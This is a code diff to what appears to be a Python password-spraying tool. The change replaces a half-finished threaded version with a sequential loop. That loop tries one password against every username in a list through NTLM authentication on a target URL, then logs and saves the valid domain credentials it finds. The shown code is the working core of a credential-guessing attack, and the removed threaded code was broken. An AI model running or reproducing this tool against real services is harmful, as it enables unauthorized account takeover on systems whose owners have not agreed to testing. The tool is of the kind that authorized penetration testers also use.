@@ -11,42 +11,12 @@ import random
 import sys
 import os
 import time
-import threading
-import queue
 from requests_ntlm2 import HttpNtlmAuth
 from optparse import OptionParser
 from utils import messages
 from pathlib import Path
 from datetime import datetime
 from datetime import timedelta
-
-exitFlag = 0
-
-class userThread(threading.Thread):
-    def __init__(self, threadid, name, workq, log, verbose, password, domain, targeturl):
-        threading.Thread.__init__(self)
-        self.threadid = threadid
-        self.name = name
-        self.workq = workq
-        self.log = log
-        self.verbose = verbose
-        self.password = password
-        self.domain = domain
-        self.targeturl = targeturl
-
-    def run(self):
-        # TODO Add queue check/lock and pull of user from queue
-        resp = sendrequest(self.targeturl, user, self.password, self.domain, self.log)
-        isFound, msg = processresponse(resp)
-        logoutput = "{}: {}\\{}: {}".format(msg, self.domain, user, self.password)
-
-        if isFound:
-            self.log.success(logoutput)
-            # TODO figure out a way to return this. 
-            masterFound = True
-        else:
-            if self.verbose:
-                self.log.error(logoutput, False)
 
 def sendrequest(url, username, password, domain, log):
     auth=HttpNtlmAuth("{}\\{}".format(domain, username), password)
@@ -163,38 +133,22 @@ def main():
         outfile = open(options.outputdir + "/" + pwd + ".txt", 'w')
         masterFound = False
 
-        workq = queue.Queue(len(userfile))
-        threadlist = ["t1", "t2", "t3"]
-        threads = []
-        threadID = 1
-        qlock = threading.Lock()
-
-        # Add items to queue
         for user in userfile:
             user = user.strip('\n')
-            workq.put(user)
+            resp = sendrequest(options.targeturl, user, pwd, options.domain, log)
+            isFound, msg = processresponse(resp)
+            logoutput = "{}: {}\\{}: {}".format(msg, options.domain, user, pwd)
 
-        # Start threads
-        for tname in threadlist:
-            thread = userThread(threadID, tname, workq, log, options.verbose, pwd, options.domain, options.targeturl)
-            thread.start()
-            threads.append(thread)
-            threadID += 1
+            if isFound:
+                log.success(logoutput)
+                masterFound = True
+            else:
+                if options.verbose:
+                    log.error(logoutput, False)
 
-        while not workq.empty():
-            pass
+            outfile.write(logoutput + '\n')
+            outfile.flush()
 
-        global exitFlag
-        exitFlag = 1
-
-        for t in threads:
-            t.join()
-
-        # TODO: receive output from thread and log 
-        outfile.write(logoutput + '\n')
-        outfile.flush()
-
-        # TODO: Deal with setting masterFound from a thread
         if masterFound == False:
             output = "No valid creds for {}".format(pwd)
             log.error(output, False)
